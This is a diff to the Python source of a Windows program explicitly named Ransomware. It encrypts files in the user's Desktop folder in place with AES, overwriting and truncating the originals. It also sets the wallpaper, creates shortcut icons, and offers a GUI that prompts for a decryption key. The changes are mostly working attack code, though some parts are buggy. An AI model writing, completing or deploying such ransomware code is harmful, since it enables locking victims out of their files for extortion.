@@ -27,6 +27,7 @@ import time
 import winshell
 import win32com.client
 from win32com.client import Dispatch
+import win32api
 
 
 
@@ -85,12 +86,15 @@ def set_wallpaper(image_filename):
 
 #Define RW Class for functionality
 class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherits from pyqt, runnable object 4 multithreading
+    #encryptionPass = None
+    #decryptionPass = None
     def __init__(self):                             # Constructor, inits Ransomware object in pyqt multithread envriroment
         super(Ransomware, self).__init__()          # calls the constructor of qrunnable for intialization
         self.threadpool = PyQt5.QtCore.QThreadPool()# creates an instance of Qthreadpool( manages pools of threads)
         self.randomId = self.rID(12)                # generates a randID 12 length using rID method
         self.encryptionPass = self.rSeed(32)        # generates random seed 32 length using rSeed
         self.decryptionPass = self.rSeed(32)
+        print(f"Decryption key generated: {self.decryptionPass}")  # Print decryption key
         self.filePath = "C:\\Users\\{self.userName}\\Desktop\\"               # sets file path attribute 
         self.ip = ""                                # inits ip attribute to empty string 4 later
         self.userName = ""                          # inits userName attribute to empty string 4 later
@@ -114,61 +118,82 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
             print(f"Error getting user details: {e}")
 
 # Modify the encryption part of the encryptFile method
+    @staticmethod
+    def set_icon(icon_path, target_file_path):
+        # Check if both the file and icon exist
+        if not os.path.isfile(target_file_path):
+            print(f"Error: The specified file '{target_file_path}' does not exist.")
+            return
+        if not os.path.isfile(icon_path):
+            print(f"Error: The specified icon file '{icon_path}' does not exist.")
+            return
+    
+        try:
+            # Get absolute path for target file and icon
+            target_file_path = os.path.abspath(target_file_path)
+            icon_path = os.path.abspath(icon_path)
+        
+            print(f"Icon set for '{target_file_path}' to '{icon_path}'.")
+        except Exception as e:
+            print(f"Error setting icon for '{target_file_path}': {e}")
+
+    
+    
     def encryptFile(self, file):
         try:
             key = self.encryptionPass.encode()  # Convert encryption pass to bytes
             cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).encryptor()  # Create encryptor
 
-            # Read plaintext from file
-            with open(file, 'rb') as infile:
-                plaintext = infile.read()
-
-            # Apply PKCS7 padding to the plaintext
-            padder = padding.PKCS7(128).padder()
-            padded_plaintext = padder.update(plaintext) + padder.finalize()
-
-            # Encrypt the padded plaintext
-            ciphertext = cipher.update(padded_plaintext) + cipher.finalize()
-
-            # Determine the new filename with the ".encrypted" extension
-            new_filename = file + ".encrypted"
-
-            # Write the encrypted ciphertext to the new file
-            with open(new_filename, "wb") as outfile:
-                outfile.write(ciphertext)
-
-            # Delete the original file
-            os.remove(file)
-
-            # Change icon of encrypted file (assuming this part is correctly implemented)
-            elf.change_file_icon(new_filename)
+            # Read plaintext
+            with open(file, 'rb+') as f:
+                plaintext = f.read()
+                padded_plaintext = padding.PKCS7(128).padder().update(plaintext) + padding.PKCS7(128).padder().finalize()  # Add padding to plaintext
+                ciphertext = cipher.update(padded_plaintext) + cipher.finalize()  # Encrypt plaintext
+                
+                # Move file pointer to the beginning of the file
+                f.seek(0)
+                
+                # Write encrypted data to the same file
+                f.write(ciphertext)
+                f.truncate()  # Truncate the file to remove any remaining plaintext
         except Exception as e:
             print(f"Error encrypting {file}: {e}")
 
-
-
-    def change_file_icon(self, file_path):
-        file_name = os.path.basename(file_path)
-        shell = win32com.client.Dispatch("WScript.Shell")
-        desktop = shell.SpecialFolders("Desktop")
-        shortcut = shell.CreateShortCut(os.path.join(desktop, file_name + '.lnk'))
-        shortcut.IconLocation = 'icon.png'
-        shortcut.Save()
-
-
     def decryptFile(self, file, decryption_key):
         try:
-            with open(file, 'rb') as infile:
-                ciphertext = infile.read()
-                key = decryption_key.encode()  # Convert decryption key to bytes
-                cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).decryptor()
+            key = decryption_key.encode()  # Convert decryption key to bytes
+            cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).decryptor()
+
+            # Read ciphertext
+            with open(file, 'rb+') as f:
+                ciphertext = f.read()
                 plaintext = cipher.update(ciphertext) + cipher.finalize()
                 unpadder = padding.PKCS7(128).unpadder()
                 decrypted_data = unpadder.update(plaintext) + unpadder.finalize()
-            with open(file, "wb") as outfile:
-                outfile.write(decrypted_data)
+
+                # Move file pointer to the beginning of the file
+                f.seek(0)
+
+                # Write decrypted data to the same file
+                f.write(decrypted_data)
+                f.truncate()  # Truncate the file to remove any remaining ciphertext
         except Exception as e:
             print(f"Error decrypting {file}: {e}")
+
+
+    def change_file_icon(self, file_name):
+        try:
+            desktop = os.path.join(os.path.expanduser('~'), 'Desktop')
+            shortcut = os.path.join(desktop, file_name + '.lnk')
+            shell = win32com.client.Dispatch("WScript.Shell")
+            shortcut = shell.CreateShortCut(shortcut)
+            shortcut.IconLocation = 'icon.png'
+            shortcut.Save()
+        except Exception as e:
+            print(f"Error changing file icon for {file_name}: {e}")
+
+
+    
 
     # Main method for ransomware functionality
 
@@ -383,30 +408,41 @@ class RansomwareGUI(QMainWindow):
     def get_encrypted_files(self):
         encrypted_files = []
         for root, directories, files in os.walk('path_to_your_directory'):
-            for filename in files:
+            for directory in directories:  # Iterating over directories
+                directory_path = os.path.join(root, directory)
+                # Add criteria to identify encrypted files in the directory
+                for filename in os.listdir(directory_path):
+                    filepath = os.path.join(directory_path, filename)
+                    # Add criteria to identify encrypted files
+                    if filename.endswith('.encrypted'):  # Example criteria (change as per your encryption method)
+                        encrypted_files.append(filepath)
+            for filename in files:  # Iterating over files
                 filepath = os.path.join(root, filename)
-                # Add criteria to identify encrypted files
+                # Add criteria to identify encrypted files in the root directory
                 if filename.endswith('.encrypted'):  # Example criteria (change as per your encryption method)
                     encrypted_files.append(filepath)
         return encrypted_files
+
     
     def promptDecryptionKey(self):
         # Prompt for decryption key
         text, ok = QInputDialog.getText(self, "Enter Decryption Key", "Enter your decryption key:")
-
+    
         if ok:
             decryption_key = text
-            self.decryptFiles()
+            self.decryptFiles(decryption_key)  # Pass the obtained decryption key to decryptFiles method
 
-    def decryptFiles(self):
-        decryption_key = self.decryptionPass  # Use the decryption key generated during encryption
+
+    def decryptFiles(self, decryption_key):
         if decryption_key:
+            print(f"Decryption key for all files: {decryption_key}")  # Debug statement to print decryption key
             ransomware_instance = Ransomware()
         for root, directories, files in os.walk(ransomware_instance.filePath):
             for filename in files:
                 filepath = os.path.join(root, filename)
                 for base in fileTypes:
                     if base in filepath:
+                        print(f"Decrypting file: {filepath}")  # Debug statement to print file being decrypted
                         threading.Thread(target=ransomware_instance.decryptFile, args=(filepath, decryption_key)).start()
             for directory in directories:  # Iterating over subdirectories
                 try:
@@ -414,9 +450,12 @@ class RansomwareGUI(QMainWindow):
                         filepath = os.path.join(root, directory, filename)
                         for base in fileTypes:
                             if base in filepath:
+                                print(f"Decrypting file: {filepath}")  # Debug statement to print file being decrypted
                                 threading.Thread(target=ransomware_instance.decryptFile, args=(filepath, decryption_key)).start()
                 except PermissionError as e:
-                    print(f"PermissionError: {e}. Skipping directory: {directory}")  
+                    print(f"PermissionError: {e}. Skipping directory: {directory}")
+
+  
 
 
 
